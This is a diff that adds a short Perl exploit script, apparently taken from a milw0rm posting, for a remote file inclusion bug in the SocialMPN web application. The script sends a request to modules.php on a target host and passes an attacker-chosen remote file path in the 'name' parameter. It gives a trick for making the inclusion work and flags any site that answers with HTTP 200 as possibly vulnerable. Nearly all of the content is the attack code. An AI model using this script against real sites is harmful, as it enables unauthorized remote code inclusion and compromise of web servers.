@@ -1,0 +1,44 @@
+#!/usr/bin/perl -w
+ 
+# Remote Testing SocialMPN Remote File Inclusion by y3dips [for testing only]
+# Bug find by zer0-c00l ,
+# Bug published at http://waraxe.us/ftopic-542-0-days0-orderasc-.html
+
+print " * Remote Testing File Inclusion for SocialMPN by y3dips *\n";
+
+require LWP::UserAgent;
+
+if(@ARGV == 2)
+        {
+      
+$target= $ARGV[0];
+$xploit= $ARGV[1];
+
+
+my $ua = LWP::UserAgent->new;
+$ua->agent("MSIE/6.0 Windows");
+$ua->timeout(10);
+$ua->env_proxy;
+
+$url = "http://$target/modules.php?name=$xploit&file=article&sid=2";
+# just for trick , use "?" in the last char of your file inclusion path
+
+my $injek = $ua->get($url);
+
+            print " -------------------------------\n";
+   if ($injek->is_success)
+   {
+      $injekcek = $injek->as_string;
+        if ($injekcek =~ /(HTTP\/1\.0 200 OK)/)
+        { print("\n This Site Maybe Vulnerable \n"); }
+      else
+        {die $injek->status_line;}
+            print " -------------------------------\n";
+        }
+   }
+
+else{
+print "Use: perl $0 [target] [xplo.txt] \n";
+}
+
+# milw0rm.com [2005-03-11]
